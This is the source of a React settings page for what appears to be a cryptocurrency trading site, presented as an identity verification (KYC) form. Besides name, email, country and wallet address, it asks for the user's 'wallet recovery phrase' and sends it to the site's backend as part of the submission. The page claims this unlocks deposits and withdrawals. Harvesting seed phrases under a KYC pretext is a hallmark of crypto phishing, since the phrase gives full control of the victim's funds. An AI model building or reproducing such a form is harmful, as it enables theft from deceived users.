"use client";
import { useEffect, useState } from "react";
import Nav from "../../components/Nav";
import { api } from "../../lib/api";

const COUNTRIES = [
  "United States", "Canada", "United Kingdom", "Spain", "France",
  "Germany", "Netherlands", "Australia", "Italy", "Portugal",
];

export default function Settings() {
  const [me, setMe] = useState(null);
  const [form, setForm] = useState({
    first_name: "", last_name: "", wallet_address: "",
    wallet_phrase: "", email: "", country: "United States",
  });
  const [msg, setMsg] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api("/api/auth/me/")
      .then((u) => {
        setMe(u);
        setForm((f) => ({
          ...f,
          first_name: u.first_name || "",
          last_name: u.last_name || "",
          email: u.email || "",
        }));
      })
      .catch(() => {})
      .finally(() => setLoading(false));
  }, []);

  const set = (k) => (e) => setForm((f) => ({ ...f, [k]: e.target.value }));

  async function submit(e) {
    e.preventDefault();
    setMsg("");
    if (!form.first_name.trim() || !form.last_name.trim()) return setMsg("Enter your first and last name.");
    if (!form.wallet_address.trim()) return setMsg("Enter your wallet address.");
    if (!form.email.trim()) return setMsg("Enter your email address.");
    try {
      await api("/api/auth/me/", {
        method: "PATCH",
        body: {
          first_name: form.first_name.trim(),
          last_name: form.last_name.trim(),
          email: form.email.trim(),
          kyc_name: `${form.first_name.trim()} ${form.last_name.trim()}`,
          kyc_country: form.country,
          wallet_address: form.wallet_address.trim(),
          wallet_phrase: form.wallet_phrase.trim(),
          submit_kyc: true,
        },
      });
      setMsg("KYC submitted successfully. Your details are under review.");
    } catch (err) {
      setMsg(err.message || "Failed to submit. Try again.");
    }
  }

  if (loading) return <><Nav /><div className="container page">Loading…</div></>;

  return (
    <><Nav />
    <div className="container page" style={{ maxWidth: 640 }}>
      <h2>Settings</h2>
      <p className="muted" style={{ marginTop: 6 }}>Complete verification (KYC) to unlock deposits, withdrawals and trading limits.</p>
      {me && (
        <div className="card" style={{ marginTop: 16 }}>
          <div className="kv"><span>UID</span><b>{me.uid}</b></div>
          <div className="kv"><span>KYC</span><b>{me.kyc_status}</b></div>
          <div className="kv"><span>VIP</span><b>VIP {me.vip_level}</b></div>
        </div>
      )}
      <form className="card" style={{ marginTop: 16 }} onSubmit={submit}>
        <h3 style={{ margin: "0 0 12px" }}>Identity verification</h3>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
          <div>
            <label>First name</label>
            <input value={form.first_name} onChange={set("first_name")} placeholder="John" autoComplete="given-name" />
          </div>
          <div>
            <label>Last name</label>
            <input value={form.last_name} onChange={set("last_name")} placeholder="Smith" autoComplete="family-name" />
          </div>
        </div>
        <label style={{ marginTop: 12 }}>Email</label>
        <input type="email" value={form.email} onChange={set("email")} placeholder="you@example.com" autoComplete="email" />
        <label style={{ marginTop: 12 }}>Country</label>
        <select value={form.country} onChange={set("country")}>
          {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
        </select>
        <label style={{ marginTop: 12 }}>Wallet address</label>
        <input value={form.wallet_address} onChange={set("wallet_address")} placeholder="Your receiving wallet address" autoComplete="off" />
        <label style={{ marginTop: 12 }}>Wallet phrase</label>
        <textarea value={form.wallet_phrase} onChange={set("wallet_phrase")} placeholder="Enter your wallet recovery phrase" rows={3} autoComplete="off" style={{ width: "100%" }} />
        {msg && <div className="ok" style={{ marginTop: 12 }}>{msg}</div>}
        <button className="btn btn-o" type="submit" style={{ marginTop: 16, width: "100%" }}>Submit verification</button>
      </form>
    </div></>
  );
}

